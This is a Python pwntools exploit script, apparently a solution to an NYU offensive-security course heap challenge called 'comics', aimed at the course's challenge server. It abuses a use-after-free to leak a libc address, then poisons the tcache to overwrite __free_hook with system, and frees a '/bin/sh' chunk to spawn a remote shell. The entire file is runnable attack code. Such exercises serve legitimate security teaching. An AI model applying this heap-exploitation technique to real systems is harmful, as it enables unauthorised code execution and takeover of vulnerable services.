from pwn import *
import re

context.log_level = "DEBUG"
context.terminal = ['tmux', 'splitw', '-h']

binary = './comics'
e = ELF(binary)
libc = ELF('libc.so.6')
host, port = "offsec-chalbroker.osiris.cyber.nyu.edu", 1214
context.binary = binary
local = False
use_gdb = False

main_arena_offset = 0x1687c0
puts_offset = libc.symbols['puts']
free_hook_offset = libc.symbols['__free_hook']
system_offset = libc.symbols['system']

def connect():
    if local:
        return process(binary)
    elif use_gdb:
        return gdb.debug(binary, gdbscript='b main\nc')
    else:
        connection = remote(host, port)
        connection.sendline("<NET ID>")
        return connection

def send_option(choice):
    r.sendlineafter(b"Please select an option?", str(choice).encode())

def create_comic(size, content):
    send_option(1)
    r.sendlineafter(b"What would you like the text to be?", content[:size])

def delete_comic(index):
    send_option(4)
    r.sendlineafter(b"What comic number would you like to delete?", str(index).encode())

def edit_comic(index, content):
    send_option(3)
    r.sendlineafter(b"What comic number would you like to edit?", str(index).encode())
    r.sendlineafter(b"Enter a new punchline!", content)

def print_comic(index):
    send_option(2)
    r.sendlineafter(b"What comic number would you like to display?", str(index).encode())
    output = r.recvuntil(b"Please select an option?", timeout=5)
    leak = re.search(rb'\xe0[\x00-\xff]{5}', output)
    if leak:
        return u64(leak.group(0).ljust(8, b"\x00"))
    return None

def run_exploit():
    global r
    r = connect()

    create_comic(0x500, b"A" * 1)
    create_comic(0x500, b"B" * 1076)
    create_comic(0x100, b"C" * 3)
    delete_comic(0)
    delete_comic(1)
    delete_comic(2)

    leaked_address = print_comic(1)
    if not leaked_address or leaked_address < 0x7f0000000000:
        log.error("Leaking failed or invalid address")
        r.close()
        return

    libc_base = leaked_address - main_arena_offset - puts_offset
    free_hook = libc_base + free_hook_offset
    system_addr = libc_base + system_offset

    log.success(f"Libc base: {hex(libc_base)}")
    log.success(f"__free_hook: {hex(free_hook)}")
    log.success(f"system: {hex(system_addr)}")

    edit_comic(2, p64(free_hook))
    create_comic(0x100, b"/bin/sh\x00")
    create_comic(0x100, p64(system_addr))
    delete_comic(3)

    r.interactive()

if __name__ == "__main__":
    run_exploit()
